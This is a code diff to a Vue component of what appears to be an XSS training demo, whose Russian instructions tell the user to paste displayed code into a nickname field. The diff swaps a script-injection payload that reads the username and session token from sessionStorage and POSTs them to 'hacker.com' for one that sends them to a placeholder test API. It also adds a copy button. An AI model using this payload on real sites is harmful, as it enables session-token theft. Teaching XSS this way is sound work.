@@ -35,12 +35,23 @@
                                   <br /><br />Рассмотрите и скопируйте код из чёрного окна, вставьте в поле “Никнейм”."></anonymous-modal>
       <div class="vk__helper__message">
         <span>NoName&lt;/p&gt;&lt;script&gt;<br/>
-        const username = sessionStorage.getItem('username');<br/>
-        const token = sessionStorage.getItem('token');<br/>
-        console.log(username, token);<br/>
-        fetch('http://hacker.com',{<br/>
-        method: 'post',<br/>
-        body:JSON.stringify({username,token})});&lt;/script&gt;&lt;p&gt;</span>
+          (async () => {<br/>
+          const data = {<br/>
+          &nbsp;&nbsp;&nbsp;&nbsp;username: sessionStorage.getItem('username'),<br/>
+          &nbsp;&nbsp;&nbsp;&nbsp;token: sessionStorage.getItem('token')<br/>
+          };<br/>
+          console.log('Ник: ', data.username, '\n\nТокен: ', data.token);<br/>
+          const response = await fetch('https://jsonplaceholder.typicode.com/posts', {<br/>
+          &nbsp;&nbsp;&nbsp;&nbsp;method: 'POST',<br/>
+          &nbsp;&nbsp;&nbsp;&nbsp;headers: {
+          &nbsp;&nbsp;&nbsp;&nbsp;'Content-Type': 'application/json'
+          &nbsp;&nbsp;&nbsp;&nbsp;},<br/>
+          &nbsp;&nbsp;&nbsp;&nbsp;body: JSON.stringify(data)<br/>
+          });<br/>
+          const result = await response.json();
+      console.log('Response:', result);})()<br/>
+          &lt;/script&gt;&lt;p&gt;</span>
+        <button @click="copyToClipboard">Скопировать</button>
       </div>
   </div>
 </template>
@@ -62,6 +73,10 @@ export default {
       sessionStorage.setItem('username', this.username);
       sessionStorage.setItem('token', token);
       this.$router.push(`/startXSS`);
+    },
+    copyToClipboard() {
+      const textToCopy = document.querySelector('.vk__helper__message span').textContent
+      navigator.clipboard.writeText(textToCopy);
     }
   }
 }
@@ -135,7 +150,7 @@ img {
 
 .vk__helper__message {
   border-radius: 1vw;
-  background: #263238;
+  background: rgba(38, 50, 56, 0.93);
   width: 50vw;
   position: absolute;
   right: -3vw;
@@ -143,8 +158,27 @@ img {
   left: 5%;
   bottom: 5%;
   padding: 1.5vw 3vw 1.5vw 1.5vw;
+  font-size: small;
 }
 .vk__helper__message span {
   color: rgba(53, 255, 49, 1);
+}
+
+.vk__helper__message button {
+  background-color: rgba(0, 0, 0, 0);
+  color: rgba(53, 255, 49, 1);
+  border-radius: 1vh;
+  border: 1px solid rgba(53, 255, 49, 1);
+  padding: 0.5vw 1vw;
+  font-size: small;
+  cursor: pointer;
+  position: absolute;
+  right: 1vw;
+  bottom: 2vh;
+}
+
+.vk__helper__message button:hover {
+  background-color: rgba(53, 255, 49, 1);
+  color: #212121;
 }
 </style>
